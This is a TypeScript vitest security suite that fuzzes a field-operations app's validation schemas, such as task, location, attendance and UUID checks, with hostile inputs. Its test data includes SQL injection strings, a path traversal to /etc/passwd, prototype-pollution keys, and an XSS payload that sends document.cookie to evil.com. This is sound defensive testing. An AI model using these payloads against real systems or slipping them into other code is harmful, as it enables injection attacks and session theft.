import { describe, it, expect } from 'vitest';
import {
  createTaskSchema,
  updateTaskSchema,
  createLocationSchema,
  clockInSchema,
  adjustAttendanceSchema,
  uuidSchema,
} from '@fieldops/validation';
import { Priority, TaskStatus, AttendanceStatus } from '@fieldops/types';

describe('Security Suite: Input Validation, Fuzzing & Injection Defense', () => {
  describe('UUID & Identifier Fuzzing', () => {
    it('rejects malformed, truncated, or SQL-injected UUID strings', () => {
      const maliciousIds = [
        '',
        'not-a-uuid',
        '12345',
        '00000000-0000-0000-0000-00000000000g', // invalid hex
        "' OR '1'='1",
        "'; DROP TABLE tasks; --",
        '00000000-0000-0000-0000-000000000001;--',
        '../../etc/passwd',
        '<script>alert(1)</script>',
      ];

      for (const id of maliciousIds) {
        const result = uuidSchema.safeParse(id);
        expect(result.success).toBe(false);
      }
    });
  });

  describe('Oversized Payloads & Length Boundary Fuzzing', () => {
    it('rejects task titles exceeding max character limits', () => {
      const oversizedTitle = 'A'.repeat(500); // Max is typically 255
      const result = createTaskSchema.safeParse({
        title: oversizedTitle,
        priority: Priority.HIGH,
      });

      expect(result.success).toBe(false);
    });

    it('rejects task descriptions exceeding max character limits (e.g. 100KB buffer exhaustion)', () => {
      const massiveDescription = 'B'.repeat(100 * 1024); // 100KB
      const result = createTaskSchema.safeParse({
        title: 'Valid Task Title',
        description: massiveDescription,
      });

      expect(result.success).toBe(false);
    });

    it('rejects attendance adjustment reason when empty or excessively long', () => {
      const emptyReason = adjustAttendanceSchema.safeParse({
        attendanceId: '00000000-0000-0000-0000-000000000001',
        checkOutAt: '2026-09-28T17:00:00.000Z',
        reason: '',
      });
      expect(emptyReason.success).toBe(false);

      const massiveReason = adjustAttendanceSchema.safeParse({
        attendanceId: '00000000-0000-0000-0000-000000000001',
        checkOutAt: '2026-09-28T17:00:00.000Z',
        reason: 'R'.repeat(10000),
      });
      expect(massiveReason.success).toBe(false);
    });
  });

  describe('Enum Fuzzing & Type Confusion', () => {
    it('rejects illegal status strings outside authorized state machine enums', () => {
      const maliciousStatuses = [
        'ADMIN',
        'ROOT',
        'DELETED',
        '__proto__',
        'constructor',
        'COMPLETED; DROP TABLE users',
      ];

      for (const status of maliciousStatuses) {
        const result = updateTaskSchema.safeParse({
          status: status as any,
        });
        expect(result.success).toBe(false);
      }
    });
  });

  describe('SQL & Script Injection Resilience', () => {
    it('safely validates location names containing SQL escape characters as literal text without syntax corruption', () => {
      const sqlInjectionName = "O'Connor & Sons; SELECT * FROM credentials;--";
      const result = createLocationSchema.safeParse({
        name: sqlInjectionName,
        address: '123 Market St',
        latitude: 37.7749,
        longitude: -122.4194,
        radiusMeters: 100,
      });

      // The schema safely parses the string value as literal text
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.name).toBe(sqlInjectionName);
      }
    });

    it('safely parses task descriptions containing HTML and script tags as literal strings without execution', () => {
      const xssDescription = '<script>window.location="http://evil.com/steal?c="+document.cookie</script>';
      const result = createTaskSchema.safeParse({
        title: 'Safety Inspection',
        description: xssDescription,
      });

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.description).toBe(xssDescription);
      }
    });
  });

  describe('Numeric & Coordinate Boundary Fuzzing', () => {
    it('rejects impossible latitude and longitude coordinates', () => {
      const invalidLat = createLocationSchema.safeParse({
        name: 'Invalid Site',
        address: 'Test Addr',
        latitude: 95.0, // Valid range: [-90, 90]
        longitude: -122.4194,
      });
      expect(invalidLat.success).toBe(false);

      const invalidLon = createLocationSchema.safeParse({
        name: 'Invalid Site',
        address: 'Test Addr',
        latitude: 37.7749,
        longitude: 195.0, // Valid range: [-180, 180]
      });
      expect(invalidLon.success).toBe(false);

      const negativeRadius = createLocationSchema.safeParse({
        name: 'Invalid Site',
        address: 'Test Addr',
        latitude: 37.7749,
        longitude: -122.4194,
        allowedRadiusMeters: -50,
      });
      expect(negativeRadius.success).toBe(false);
    });
  });
});
